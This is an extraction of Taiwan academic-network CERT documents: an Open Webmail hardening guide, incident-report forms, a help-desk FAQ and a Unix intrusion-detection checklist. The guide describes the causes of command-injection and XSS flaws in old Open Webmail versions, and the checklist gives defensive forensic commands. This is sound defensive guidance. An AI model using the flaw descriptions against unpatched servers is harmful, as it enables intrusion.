        "content": "),使用者利用MUA 來建立電子郵件並寄出電子郵 件或利用MUA 來收取郵件伺服器上的電子郵件。本文所說明的Open Webmail 軟體即為一種MUA 軟體。與常用的outlook 軟體不同的是,Open Webmail 是一種網頁應用程式,使用者並不需安裝任何軟體,而是使用瀏 覽器即可完成寄信與收信等基本的電子郵件服務。 三、主機系統安全管理說明 在電子郵件服務系統架構中,主機系統為最底層之架構。因此,維護 主機系統之安全為首要之任務。一旦主機系統遭受到資安的威脅,架構於 其上的電子郵件服務系統同樣也將面臨相關的資安風險,為有效降低主機 系統所面臨的資安風險,相關建議如下:  3 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 1. 系統主機應安裝防火牆,以及阻絕不使用之網路通訊埠(例如:網站伺 服器應僅開放通訊埠80 或443),並定期檢視防火牆相關規則是否符合 資安要求。 2. 系統主機應安裝防毒軟體,除了需更新至最新版的病毒碼外,建議也能 提供系統即時的檢查防護。 3. 系統主機需能進行作業系統與相關軟體之更新和修補,並定期或不定期 進行主機弱點掃描,以期即時找出系統潛在的漏洞。 4. 當管理人員在遠端進行伺服器主機系統維護時,應在加密管道進行(例 如:使用SSH 而非使用TELNET 不安全的連線),並應限制可維護系 統的來源範圍(例如:限定某個IP 可進行連線)。 5. 建議系統維護人員不要使用遠端遙控軟體(例如:遠端桌面)進行系統管 理、維護或更新。 6. 當系統管理者利用主控台(Console)進行維護,在離開現場前需登出 主控台。 7. 登入主控台(Console)的密碼建議不要使用原廠所設定的預設密碼。 8. 系統主機因實務需要而需建立分享功能(例如:網路芳鄰),應先建立 網路及主機之安全控制措施。 9. 系統主機應定期依照人事異動情形進行實際使用權限之調整,以及變更 使用者權限。 10. 系統主機",
        "Page_Num": "3,4"
    },
    "44": {
        "File_Name": "Open Webmail郵件系統安全管理與防護指南.pdf",
        "content": "應定期盤點帳號,並移除不相關的帳號。 11. 系統主機應準備適當及足夠之備援設施,定期執行必要之資料與軟體 備份及備援作業,以確保在意外發生時,可迅速回復正常作業。 12. 依實際需求保存伺服器主機在運作時所產生的相關記錄檔案。 四、Open Webmail 安全漏洞  4 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 為了讓使用者能夠更便利的使用郵件伺服器的功能,管理者通常會建立 Web Mail 服務,讓使用者能夠便利地利用瀏覽器,即可使用郵件服務來寄 信或收信,而Open Webmail (官方網站:https://openwebmail.org/)即是開源 碼社群中一套頗富盛名的WEB MAIL 軟體。因此,有不少的學校機關會選 擇此套軟體來建置Web Mail 服務,但也因使用者眾多,常成為惡意攻擊者 攻擊的目標,有鑑於此,在本文中將說明Open Webmail 曾被證實的相關漏 洞與建議預防方式。在此將以CVE(Common Vulnerabilities and Exposures) 組織所承認,並收錄之嚴重漏洞為主要說明對象。以Open Webmail 軟體而 言,曾被揭露並證實的重大漏洞如下所述。 1. CVE-2004-2284 項目 內容 影響範圍 攻擊者可遠端利用此弱點,在系統上執行任意指令。 影響版本 2.32 之前的版本。 弱點成因 在vacation.pl 程式中的 read_list_from_file 函數,由於未對 輸入的參數實施有效適當的過濾,導致惡意的使用者可利 用在參數上輸入惡意的指令(例如shell 指令),即可成功 的在Open Webmail 所在的主機上執行此惡意指令。 建議事項 建議更新至2.32 之後的版本,如果在實務上無法更新版 本,也可至下列網址取得更正檔來對vacation.pl 進行更 新。 http://openwebmail.org/openwebmail/download/cert/patches/ SA-04:04/vaca tion.pl.patch 2. CVE-2005-1435  5 臺灣學術網路危機處理中心(TACERT",
        "Page_Num": "4,5,6"
    },
    "45": {
        "File_Name": "Open Webmail郵件系統安全管理與防護指南.pdf",
        "content": ") TANet Computer Emergency Response Team 項目 內容 影響範圍 攻擊者可遠端利用此弱點,在系統上執行任意指令。 影響版本 2.51 之前的版本。 弱點成因 在使用者登入的情況下,由於程式所使用的開檔函數(名 稱為open),並未適當的對輸入的參數實施有效的過濾, 導致如果所欲開啟的檔案,其檔案名稱具有如shell 指令 的名稱,在利用open 開啟檔案的過程中,當解析到檔案 名稱時,即會在Open Webmail 所在的主機上執行檔案名 稱中所夾帶的shell 指令。 建議事項 建議更新至2.51 之後的版本。 3. CVE-2005-1435 項目 內容 影響範圍 攻擊者可遠端利用此弱點,在系統上執行任意腳本指令。 影響版本 2.51 之前的版本。 弱點成因 Open Webmail 2.51 之前版本存在跨網站腳本攻擊(Cross Site Script,XSS)漏洞,遠端攻擊者可以借助 openwebmail-send.pl,openwebmail-advsearch.pl, openwebmail-folder.pl,openwebmail-prefs.pl, openwebmail-abook.pl,openwebmail-read.pl, openwebmail-cal.pl 等具有此漏洞的程式,注入任意惡意腳 本程式(Script),即可經由此類腳本程式觸發XSS 攻擊。 建議事項 建議更新至2.51 之後的版本。 除了上述較為嚴重的漏洞外,另外還有其它較為次要輕微的漏 洞,使用者可查看下列網址,以取得更詳盡的資訊。 https://www.cvedetails.com/vulnerability-list/vendor_id-1329/Open-Webm  6 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team ail.html 五、郵件服務系統安全 郵件服務系統主要是由MUA 及郵件伺服器所組成,而其中MUA(例如 本文中的Open Webmail)因直接被使用者所接觸,所以常成為被攻擊的目 標,除此之外,郵件伺服器也常是攻擊的目標。因此,郵件伺服器的安全 維護也是不可輕忽的議題。由於郵",
        "Page_Num": "6,7"
    },
    "46": {
        "File_Name": "Open Webmail郵件系統安全管理與防護指南.pdf",
        "content": "件系統的特殊性,在一般的情況下,郵 件系統會服務大量成員,這也就意味著在郵件伺服器上會存在大量的帳 號,在此種情況下,維護郵件伺服器上的帳號安全即成為相當重要的課題。 因為一旦帳號被入侵,攻擊者不僅能夠取得該使用者的電子郵件資訊,甚 至也會取得郵件伺服器所在主機上一般使用者的權限,所以維護郵件伺服 器的帳號安全應為首要之任務。 在關於維護帳號安全的規範上,使用者可參考NIST(National Institute of Standards and Technology, 國家標準暨技術研究院)所發佈的編號sp800-63 之數位認證建議安全規範。此規範的相關網址如下 https://pages.nist.gov/800-63-3/,它讓使用者有相關標準規範可遵循。在規範 中所提出最重要的重點即是使用者密碼的複雜度,設定太簡單即成為弱密 碼,很容易被猜測到而造成密碼外洩的資安危機。在實務上有很多的入侵 資安事件,都是因為使用者設定不適當的弱密碼所致,如同下表splashdata 密碼安全公司(官方網址為https://www.splashdata.com/)在2018 年所統計的 弱密碼排行所呈現。 名次 弱密碼 1 123456 2 password 3 123456789 4 12345678 5 12345  7 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 名次 弱密碼 6 111111 7 1234567 8 sunshine 9 qwerty 10 iloveyou 對於密碼複雜度的要求,在過去總是會建議需具備英數字,甚至於特 殊字元的建議(常導致使用者無法有效的記憶),但近來有越來越多的研究顯 示,設定長度較長的密碼更能增進安全的效益。因此,會建議要特別著重 在密碼的長度。另外,在定期更換密碼的政策方面,則要求使用者每隔一 段時間即更換密碼,此類政策是否真能達到增進資訊安全的效益,也是目 前所被討論,甚至被質疑。微軟在近期內欲在作業系統中移除「要求定期 變更密碼的密碼過期政策」的功能(相關新聞: https://www.ithome.com.tw/news/130226) ,或許正是",
        "Page_Num": "7,8"
    },
    "47": {
        "File_Name": "Open Webmail郵件系統安全管理與防護指南.pdf",
        "content": "回應此類政策的質疑。 但目前「定期更改密碼」政策是否必要,尚未形成共識,所以此類政策的 實施還是必須回歸至組織的資安政策而定。 由於開源碼軟體的盛行,有越來越多的組織會採用開源碼的解決方案 來完成網路服務的建置。開源碼軟體雖具有開放多元的特性,但其最大的 問題在於其更新軟體的機制並不夠友善,所以並不能像微軟系統一樣,只 要一鍵即可完成更新,也因此大部份的使用者在建置完成後,即不再更新。 因而造成許多潛在的資安問題,所以必須提醒管理者在使用開源碼軟體完 成網路服務建置後,必須經常至該開源碼軟體的官方網站上查看是否有新 的安全通報。如果有重大的安全通報,即需評估更新版本的必要性。以郵 件系統為例,最常使用的郵件伺服器即為Postfix,其官方網址為 http://www.postfix.org/,Postfix 的誕生,其實是為了修正Sendmail (一個最 老牌的郵件伺服器)難以上手的問題而開發出來的軟體,由於其效能優異及 易於上手(相對於Sendmail 而言)的特性,而漸漸地廣為人所用,也因此  8 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 常為惡意攻擊者所狙擊的目標。因此,建議相關管理者應經常至Postfix 官 方網站上查看是否有重大的漏洞,以及是否有相關更新檔的資訊,來即時 修正Postfix 的漏洞。簡而言之,關於維護郵件伺服器安全的相關建議如下: 1. 由於開源碼軟體的更新機制並不完善,因此在使用開源碼軟體的情況 下,建議管理者應定時至該開源碼軟體的官方網站確認是否有相關的安 全修正程式,並評估實作更新的必要性,若為商業軟體也應定時使用其 更新機制來進行更新。 2. 定時針對該軟體實施弱點掃描,並依其掃描結果進行修正。 3. 定時盤點郵件伺服器的帳號清冊,並移除不必要的帳號。 4. 宣導並確認使用者帳號並未使用弱密碼。 六、結論 隨著開源碼軟體的盛",
        "Page_Num": "8,9"
    },
    "48": {
        "File_Name": "Open Webmail郵件系統安全管理與防護指南.pdf",
        "content": "行,有越來越多的機關學校會採用相關開源碼的 解決方案來提供具有WEB MAIL 功能的電子郵件服務。對於此類的解決 方案所提供的安全建議如下: 1. 如果提供Web Mail 功能,建議需採用支持SSL 的網站服務(即使用者 使用https 連線)來對傳輸過程的資訊進行加密,以避免在登入過程中 所輸入帳號及密碼被惡意使用者所擷取,而造成帳號密碼資訊外洩。 2. 需隨時留意所採用的開源碼軟體是否有重大的安全漏洞被發佈,並視實 務情況來進行版本更新。 3. 建議時常留意CVE( https://cve.mitre.org/)組織資訊,確認所採用的開源 碼軟體是否有相關CVE 資訊。 4. 需定時清查郵件伺服器上的帳號,確認無幽靈帳號。 5. 建議要求長字串的帳號密碼(最少8 碼以上)。 6. 限定郵件伺服器可登入的來源範圍,在實務上,我們通常會利用SSH  9 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 來登入郵件伺服器進行系統管理,如果非必要,建議限定可登入的來 源範圍。 7. 定時實施系統弱點掃描,並評估進行系統修補。 8. 針對提供Web Mail 功能的軟體(例如: Open Webmail)進行網頁程式漏 洞掃描,並根據其報告進行安全修正。 七、參考資料 1. Open Webmail 官方網站 https://openwebmail.org/ 2. Open Webmail: Security Vulnerabilities https://www.cvedetails.com/vulnerability-list/vendor_id-1329/Open-Webmail.html 3.國家標準暨技術研究院(NIST)之數位認證建議安全規範 https://pages.nist.gov/800-63-3/ 4.不必再定期改密碼了!Windows 桌機及Server 版可望拿掉密碼過期政策 https://www.ithome.com.tw/news/130226 5. Postfix 官方網站 http://www.postfix.org/ ",
        "Page_Num": "9,10"
    },
    "49": {
        "File_Name": "tacertpersoninfo.pdf",
        "content": "台灣學術網路危機處理中心 個人資料聲明書 台灣學術網路危機處理中心(以下簡稱TACERT)為提供所服務的學術單位即時的 資安資訊,會蒐集相關個人基本資料,為保護個人權益, 依個人資料保護法第8 條規定(如為間接蒐集之個人資料則為第9 條規定),告知 下列事項: A.蒐集之目的 1. 發送簡訊或電子郵件通知單位連絡人資安事件 2. 其他合於計劃所定之目標所需要 B.個人資料之類別 1. 辨識個人者:如姓名、地址、電話、電子郵件等。 C.個人資料之來源 1. 當事人提供 D.利用期間 1.個人資料蒐集特定目的之存續期間或自個資當事人同意起至TACERT 服務終 止為止。 E.利用地區、對象及方式 1.地區:台灣地區(包含金門、澎湖、馬祖等地)。 2.對象:個資當事人、TACERT 共同合作團隊。 3.方式:電子文件、紙本或其他合於當時科技之適當方式 F.當事人個人資料權利 可透過書面或撥打服務專線07-5250211(週一~週五 09:00~17:00),請TACERT 提 供下列服務: 1. 查詢或請求閱覽您的個人資料 2. 請求製給您的個人資料複製本 3. 請求補充或更正您的個人資料 4. 請求停止蒐集、處理或利用您的個人資料 5. 請求刪除您的個人資料 TACERT 為提供您更好的服務與行銷活動而需蒐集、處理或利用您的個人資料時, 您可以自由選擇是否提供您的個人資料。若您選擇不提供個人資料或是提供不完 全時,基於提供您更好的服務,TACERT 將因此無法提供相關的服務。因此而導  致之後果,將由您自行承擔 本政策將定期因業務、法令或環境等因素之變迭時審議,予以適當修訂,並將依 法更新公告於網站上,除法定通知義務外,不另行通知。 ",
        "Page_Num": "1,2"
    },
    "50": {
        "File_Name": "tacert_1130802.pdf",
        "content": "1 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 臺灣學術網路各級學校資通安全事件通報單 (人工通報流程) 一. 教育機構資通安全事件單人工通報流程 依臺灣學術網路各級學校資通安全通報應變作業程序,各連線單位發現資安事 件後可先進行事件確認,經確認為資安事件後, 須於 1 小時內,至教育機構資 安通報應變網站(https://info.cert.tanet.edu.tw)通報登錄資安事件細節、影響等 級及是否申請支援等資訊,並評估該事件是否影響其他連線單位運作。 如因網路或電力中斷等事由,致使無法上網填報資安事件,可先填具附件一教 育機構資通安全事件單,以TACERT 備用通報信箱或傳真方式送至臺灣學術網 路危機處理中心(TACERT),惟待網路連線恢復後,仍須至通報應變網站補登錄 通報。 TACERT 備用通報信箱:TACERT-service@ids.mis.nsysu.edu.tw 諮詢專線:(07)5250211 傳真專線:(07)5251535 二. 學術網路DDoS 攻擊流量清洗服務事件單人工通報流程 依據臺灣學術網路(TANet)分散式阻斷服務(DDoS)通報應變作業指引,當連線單位遭受 分散式阻斷服務攻擊(Distributed Denial of Service, DDoS)時,連線單位可申請學術網 路 DDoS 攻擊流量清洗服務並進行資安事件通報。 如因網路或電力中斷等事由,致使無法上網申請DDoS 攻擊流量清洗服務事件單,可先 填具附件二學術網路DDoS 攻擊流量清洗服務申請單,以TACERT 備用通報信箱或傳真 方式送至臺灣學術網路危機處理中心(TACERT),惟待網路連線恢復後,仍須至教育機 構資安通報報表系統(https://portal.cert.tanet.edu.tw/)補申請DDoS 攻擊流量清洗服務事件 單。 TACERT 備用通報信箱:TACERT-service@ids.",
        "Page_Num": "1"
    },
    "51": {
        "File_Name": "tacert_1130802.pdf",
        "content": "mis.nsysu.edu.tw 諮詢專線:(07)5250211 傳真專線:(07)5251535  2 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 附件 一. 教育機構資通安全事件通報單 *注意事項:「◎」為必填項目 ◎ 填報時間:____年____月____日____時____分 STEP1. 請填寫事件相關基本資料 一、發生資通安全事件之機關(機構)聯絡資料: ◎ 單位名稱: ◎ 通報人: ◎ 電話 ◎ 傳真: ◎ 電子郵件信箱: STEP2. 事件發生時間 二、事件發生時: ◎ 事件發生時間:_____年____月____日____時____分 ◎ 確認(知悉)為資安事件時間:_____年____月____日____時____分 STEP3. 設備資料 三、設備資料事件發生時: ◎ IP 位置(IP address): ◎ 網際網路位置(web-url): ◎ 設備廠牌、機型: ◎ 作業系統(名稱/版本): ◎ 受駭應用軟體(名稱/版本): ◎ 已裝置之安全防護軟體: 防毒軟體(名稱/版本): 防火牆(名稱/版本): IPS/IDS(名稱/版本): 其它(名稱/版本): ◎ 受駭設備類型: □ 個人電腦 □ 伺服器 □ 大型主機 □ 網路通訊設備 □ SCADA(資料採集與監視系統) □ 控制器(PLC、PAC) □ 人機介面(HMI)  3 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team □ 其他: ◎ 受害設備說明(150字內): ◎ 損害類別說明: □ 可用性損害 □ 資料外洩 □ 資料竄改 □ 硬體損害 □ 金錢損失 □ 其他: ◎ 攻擊手法: □ 社交工程 □ 人為疏失 □ 設定錯誤 □ 設備異常/毀損 □ 電力供應異常 □ 作業系統/平台漏洞 □ 弱密碼或密碼遭暴力破解 □ 應用程式漏洞 □ ",
        "Page_Num": "1,2,3"
    },
    "52": {
        "File_Name": "tacert_1130802.pdf",
        "content": "網站設計不當 □ 行動裝置不當使用 □ 事件發生原因不明 □ 其他: ◎ 調查說明(150字內): ◎ 情資類型: □ 惡意內容 □ 惡意程式 □ 資料蒐集 □ 入侵嘗試 □ 入侵攻擊 □ 阻斷服務 □ 資訊內容安全 □ 詐欺攻擊 □ 系統弱點 □ 其他:  4 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team STEP4. 資通安全事件:基本資料 四、事件分類: ◎ INT(入侵型態): □ 系統被入侵 □ 對外攻擊 □ 針對性攻擊 □ 散播惡意程式 □ 中繼站 □ 電子郵件社交工程攻擊 □ 垃圾郵件(Spam) □ 命令與控制伺服器(C&C) □ 殭屍電腦(Bot) ◎ DEF(網頁型態) □ 惡意網頁 □ 惡意留言 □ 網頁置換 □ 釣魚網頁 □ 資料外洩 ◎ FAC(設施問題) □ 設備故障/毀損 □ 電力異常 □ 網路服務中斷 □ 設備遺失 □ 阻斷服務 ◎ 破壞程度(文字勿超過200中文字): ◎ 事件與處置說明(文字勿超過200中文字): STEP5. 資通安全事件:影響等級說明  5 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 五、資安事件判斷: 1、 事件等級:取底下三個欄位中最高等級當成最後之事件等級 2、 第3、4級事件係屬於重大資安事件,教育部各長官需親自督導進度 3、 若有3、4級事件,請立刻電話告知您所屬的主管機關 4、 如果您無法確定如何填寫時,請電話連絡您所屬的主管機關請求協 助 ◎ 請分別評估資安事件造成之機密性、完整性以及可用性衝擊: *資安事件影響等級為機密性、完整性及可用性衝擊最嚴重者(數字最大 者)* (1). 機密性衝擊:(單選)  1級-非核心業務資訊遭",
        "Page_Num": "3,4,5"
    },
    "53": {
        "File_Name": "tacert_1130802.pdf",
        "content": "輕微洩漏  2級-非核心業務資訊遭嚴重洩漏,或未涉及關鍵基礎設施維運之 核心業務資訊遭輕微洩漏  3級-未涉及關鍵基礎設施維運之核心業務資訊遭嚴重洩漏,或一 般公務機密、敏感資訊或涉及關鍵基礎設施維運之核心業務資 訊遭輕微洩漏  4級-一般公務機密、敏感資訊或涉及關鍵基礎設施維運之核心業 務資訊遭嚴重洩漏,或國家機密遭洩漏  無系統或設備受影響 (2). 完整性衝擊:(單選)  1級-非核心業務資訊或非核心資通系統遭輕微竄改  2級-非核心業務資訊或非核心資通系統遭嚴重竄改,或未涉及關 鍵基礎設施維運之核心業務資訊或核心資通系統遭輕微竄改  3級-未涉及關鍵基礎設施維運之核心業務資訊或核心資通系統遭 嚴重竄改,或一般公務機密、敏感資訊、涉及關鍵基礎設施維 運之核心業務資訊或核心資通系統遭輕微竄改  4級-一般公務機密、敏感資訊、涉及關鍵基礎設施維運之核心業 務資訊或核心資通系統遭嚴重竄改,或國家機密遭竄改  無系統或設備受影響 (3). 可用性衝擊:(單選)  1級-非核心業務之運作受影響或停頓,於可容忍中斷時間內回復 正常運作,造成機關日常作業影響  2級-非核心業務之運作受影響或停頓,無法於可容忍中斷時間內 回復正常運作,或未涉及關鍵基礎設施維運之核心業務或核心 資通系統之運作受影響或停頓,於可容忍中斷時間內回復正常 運作  6 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team  3級-未涉及關鍵基礎設施維運之核心業務或核心資通系統之運作 受影響或停頓,無法於可容忍中斷時間內回復正常運作,或涉 及關鍵基礎設施維運之核心業務或核心資通系統之運作",
        "Page_Num": "5,6"
    },
    "54": {
        "File_Name": "tacert_1130802.pdf",
        "content": "影響或 停頓,於可容忍中斷時間內回復正常運作  4級-涉及關鍵基礎設施維運之核心業務或核心資通系統之運作受 影響或停頓,無法於可容忍中斷時間內回復正常運作  無系統或設備受影響 ◎ 可能影響範圍及損失評估(文字勿超過200中文字): STEP6. 是否需要支援 六、是否需要支援: □ 是,期望支援方式: □ 電話告知 □ Email 告知 □ 否:通報單位自行解決 STEP7. 應變流程 七、應變流程: ◎ 緊急應變措施: □ 已中斷網路連線,待處理完成後再上線 □ 已停止伺服器之服務,待處理完成後再上線 □ 直接處理完成,解決辦法詳見【解決辦法】 □ 其它 ◎ 解決辦法(文字勿超過200中文字): ◎ 完成損害控制時間:_____年____月____日____時____分 ◎ 損害控制狀態: □ 是:完成損害控制 □ 是:完成損害控制與復原 備註:1、2級事件簽核至單位主管,3、4級事件簽核至資通安全長。  7 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team STEP8. 改善措施 八、改善辦法: ◎ 改善辦法(文字勿超過200中文字): ◎ 改善時間:_____年____月____日____時____分  8 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 附件二.學術網路DDoS 攻擊流量清洗服務事件單 學術網路DDoS 攻擊流量清洗服務事件單 STEP1. 請填寫事件相關基本資料 發生資通安全事件之機關(機構)聯絡資料: ◎ 單位名稱: ◎ 通報人: ◎ 電話: 傳真: ◎ 電子郵件信箱: STEP2. 請填寫申請DDoS 清洗服務的IP 資訊 ◎ 清洗IP: DNS IP: ◎ 通訊協定: ◎ 服務說明: ◎ 通訊埠: ◎申請理由: 例如:WEB、FTP 例如:80 ",
        "Page_Num": "6,7,8"
    },
    "55": {
        "File_Name": "TACERT資安窗口常見問題 .pdf",
        "content": "TACERT 資安窗口常見問題 ⚫ 密碼變更、重設失敗: TACERT 會進後台人工重設密碼,連同OID 一起寄信回覆。 校方須提供完整校名或OID,以及Email,使得TACERT 查詢、重設密碼與 提供資訊給對方。 「請提供本中心貴單位全名/OID,以及Email,謝謝您。」 ⚫ 事件單等級、內容調整: 因送出後學校無法調整內容,由TACERT 依照要求進後台調整。 「請提供本中心欲調整之事件單編號,以及欲調整之內容,謝謝您。」 ⚫ 事件單錯誤重派、刪除問題: TACERT 進後台重新輸入正確OID 並重派,或是把工單刪除。 「請提供本中心錯誤事件單之編號,以及有問題之內容,謝謝您。」 ⚫ HITCON 修補回報: 學校方告知漏洞編號,並由TACERT 進入HITCON 後台更改漏洞狀態。 「請確認HITCON 之漏洞詳情頁面,若該漏洞上方發信單位為TACERT 台 灣學術網路危機處理中心,即可由本中心調整漏洞狀態為已修補,再請提供 本中心HITCON 漏洞編號,謝謝您。」 ⚫ HITCON 帳號遺失、申請組織帳號問題: HITCON 將漏洞所屬權派給校方,因帳號遺失或沒有組織帳號,無法自行更 改,會由本中心寄信通知HITCON 修改漏洞狀態,或是請學校申請一個組 織帳號並驗證,通過後自行更改漏洞狀態。討論過後可請學校自行通知 HITCON,或是將HITCON 聯繫方式告訴校方。 「由於HITCON官方會優先將漏洞權限派發給有HITCON平台帳號的單位, 因此本中心無法更改漏洞的狀態,也無法從後台查詢到此漏洞,需使用貴單 位的HITCON 帳號,才有權限將漏洞狀態更改為已修補。因此有以下建議 方式: 1. 重新創辦貴單位之HITCON 帳號,並申請組織帳號,申請組織帳號後 可自行新增或移除共同管理組織帳號的使用者,並獲得後台權限(可被 派發漏洞資訊及更改漏洞",
        "Page_Num": "1"
    },
    "56": {
        "File_Name": "TACERT資安窗口常見問題 .pdf",
        "content": "狀態),若申請途中有遇到問題,可寄信至 service@zeroday.hitcon.org,請官方幫忙協調。  2. 將漏洞修補完成後,通知本中心,由本中心向HITCON 寄信,請官方 更改漏洞狀態。由於HITCON 需閱讀信件,此方案可能需要幾天時間 才能將漏洞狀態更改。謝謝您。」 ⚫ 通報流程、填寫問題: 知悉後,一小時內進行通報。當收到資安情資後,經適當且有效的系統調查 後,並未發現有直接或間接證據可證明系統遭受到資安事件之威脅即可選擇 INFO(資安情資)。建議在進行系統調查時進行下列步驟: (1) 檢查系統或網路相關 LOG 資訊,查看是否有異常之處。 (2) 利用如 TCPVIEW 工具軟體或 netstat 指令來查看系統是否有開啟可 疑之服務或是否有可疑之來源連線。 (3) 查看防火牆之連線記錄,確認是否有可疑之連線。 (4) 如果有設置入侵偵測軟體(IDS),進行查看是否有惡意的連線行為。 事件通報應變時效因級數而有所不同,「1」、「2」級事件需於72 小時內完成; 「3」、「4」級事件需於36 小時內完成。 「情資類型」:此資訊為事件原始情資來源之資訊類型,共可分為下列10 項 類型,請選擇適當之類型。 (1). 惡意內容:針對透過文字、照片、影片等形式散播不當內容之事件。 (2). 惡意程式:針對與相關惡意程式之事件。 (3). 資訊蒐集:針對透過掃描、探測及社交工程等攻擊手法取得資訊之事件。 (4). 入侵嘗試:針對嘗試入侵未經授權主機之事件。 (5). 入侵攻擊:針對系統遭未經授權存取或取得系統/使用者權限之事件。 (6). 阻斷服務:針對影響服務可用性或造成服務中斷之攻擊事件。 (7). 資訊內容安全:針對系統遭未經驗證存取或影響資訊機敏性之事件。 (8). 詐欺攻擊:針對偽冒他人身分、系統服務及組織等進行攻擊行為之事件。 (9). 系統弱點:針對系統存在弱點之事件。 應變",
        "Page_Num": "1,2"
    },
    "57": {
        "File_Name": "TACERT資安窗口常見問題 .pdf",
        "content": "流程之「損害控制狀態」可分為完成下列兩種狀態,請依實際狀況選擇 適合的選項: (1) 損害控制:已控管此事件所造成的危害。 (2) 完成損害控制與復原:已控管此事件所造成的危害並已完成系統復原。 改善措施欄位:改善措施指各連線單位於完成通報應變後,針對事件發生提 出相關改善措施,以完備事件處理流程及預防事件重覆發生。  ⚫ 通報演練流程、填寫問題: 第一、第二聯絡人需在演練資料整備作業期間更換一次密碼,並檢查資安聯 絡人資料是否正確。演練以「告知通報」形式進行,通報演練作業期間以郵 件及簡訊傳送「資安演練事件通知單」,演練模擬事件通知簡訊及郵件上皆 加註「告知通報演練」字樣,另事件單編號皆以「DRILL」開頭進行編碼。 執行演練單位於收到mail 及簡訊通知後,應於規定的時限內至教育機構資 安通報演練平台完成事件通報流程,並依事件等級於處理時限內完成事件應 變處理並結案。通報與填寫方式與正式事件單相同。 演練平台網址:https://drill.cert.tanet.edu.tw ⚫ 佐證資料申請: 確認事件單的「發佈編號」後,可至「事件附檔下載」,下載所需之LOG 附 檔。 ⚫ 通報平台聯絡人異動、新增及刪除問題: 聯絡人若已不在職,可先申請重設密碼後請他人登入,並修改個人資料,以 更換新的聯絡人;若在職,可直接請異動之聯絡人修改個人資料。要新增或 是刪除聯絡人,必須使用第一或第二聯絡人帳號,在帳號管理裡面做新增或 是刪除後面聯絡人的帳號。 ⚫ EWA 事件單填寫問題: 處理狀況分為四種。 1. 確實事件:經查證後為確實事件,須先「自行通報」,並填入自行通報 的資安事件編號。 2. 確實事件(未造成損害):一樣須通報後填入資安事件單編號。 3. 誤判:經查證後",
        "Page_Num": "2,3"
    },
    "58": {
        "File_Name": "TACERT資安窗口常見問題 .pdf",
        "content": "確認為誤判事件,並於「原因」欄位中,說明誤判原因。 4. 無法判斷:經查證後確認為無法判斷事件,於「原因」欄位中,說明無 法判斷原因。 ",
        "Page_Num": "3"
    },
    "59": {
        "File_Name": "threatdoc.pdf",
        "content": "惡意網站威脅來源清單取得說明文件  一線人員(學校資安人員) 請洽詢所屬的上層區縣市網人員來取得相關資訊 ,您可利用登入資安通報平台(https://info.cert.tanet.edu.tw/)來取 得二線人員資訊。如下圖所示  二線人員(區縣市網人員) 您可利用二線審核帳號(英文+OID 帳號,如Z2.16.....)及密碼登入資安通 報報表系統(https://portal.cert.tanet.edu.tw/)的「威脅名單」功能 下載。系統操作手冊請參閱資安通報報表系統操作手冊。 *威脅清單內容為機敏性資料,僅供公務使用,嚴禁外流並依公務密件相關 規定處理! ",
        "Page_Num": "1"
    },
    "60": {
        "File_Name": "Unix安全.pdf",
        "content": "Unix/Linux 系統入侵檢測 管理流程 TACERT 臺灣學術網路危機處理中心團隊編譯 資料來源: CERT SOCIETE GENERALE http://cert.societegenerale.com/en/publications.html  1 Taiwan Academic Network Computer emergency Response Team(TACERT) 目錄 1. 準備((Preparation) ............................................................. 2 2. 確認 ..................................................................................... 2 3. 遏止(Containment) ............................................................ 7 4. 修正(Remediation) ............................................................. 8 5. 復原(Recovery) .................................................................. 9 6. 後續情況(Aftermath) ......................................................... 9 這份資安事件應變小抄,專給想要調查安全事件的網管人員。記住:面對事件時, 跟著資安事件應變方法的流程,記下記錄不要驚慌。如果需要請立刻聯絡臺灣學 術網路危機處理中心(TACERT)。  2 Taiwan Academic Network Computer emergency Response Team(TACERT) 1. 準備((Preparation) 1-1. 執法調查員應該要能實際接觸可疑的系統。 1-2. 為了當作法庭證據可能需要將硬碟做實體備份。最後,如果 需要,切斷所有與可疑的機器接觸的網路連結。 1-3. 一台機器或是伺服器平常的網路活動知識是必要的,應該要 在安全的地方保有一個記錄平時通訊埠活動的檔案,才能有 效率的比較目前的情況。 1-4. 如果能具備平時在機器上運作服務的知識將會有很大的幫助。 有需要時不要猶豫向Unix/Linux 專家請求幫助。一個好意見 對於機器上的服務或是執行的程序也能有所了解。 1-5. 你應該要固定更新重要檔案(尤其是具有SUID 和GUID 的檔 案),且它應該被存放在遠離網路的地方。有了這個列表,你 可以輕易地分開正常的SUID 檔案並偵測異常的部份。 2. 確認  不尋常的帳戶(Unusual Accounts) – 在/etc/passwd 裡尋找任何可疑的帳戶,尤其是UID 為0 的 (root 帳戶)。另外也要檢查/etc/group 和/etc/shadow 兩個檔案 – 尋找被刪除的帳戶留下的檔案,這些檔案可能被用",
        "Page_Num": "1,2,3"
    },
    "61": {
        "File_Name": "Unix安全.pdf",
        "content": "在攻擊  3 Taiwan Academic Network Computer emergency Response Team(TACERT) #find / \\( -nouser -o -nogroup\\) -print #find / -uid 0 \\( -perm -4000 -o -perm 2000 \\) -print #find / -name “ *” -print #find / -name “. *” -print #find / -name “.. *” -print #find / -size +10MB -print #lsof +L1 #chkconfig -list 上  不尋常的檔案(Ususual Files) – 尋找所有的SUID 和GUID 的檔案: – 尋找怪異的文件名,例如開頭為 ”.” , ”..” 或 ” ”: – 尋找大型檔案(大於10MB) – 尋找正在運行的程序或是已被取消鏈結的文件: – 尋找在/proc 和/tmp 中的異常檔案。/tmp 是駭客選擇儲存惡 意檔案的地方之一。  不尋常的服務(Unusual Services) – (Linux 限定)執行chkconfig(假如有安裝)去檢查所有服務: – 查看執行中的程序(記住:一個rootkit 可能改變本文裡你的  4 Taiwan Academic Network Computer emergency Response Team(TACERT) #ps -aux 一切結果,尤其是這裡) – 使用lsof -p [pid]查詢不知道的程序 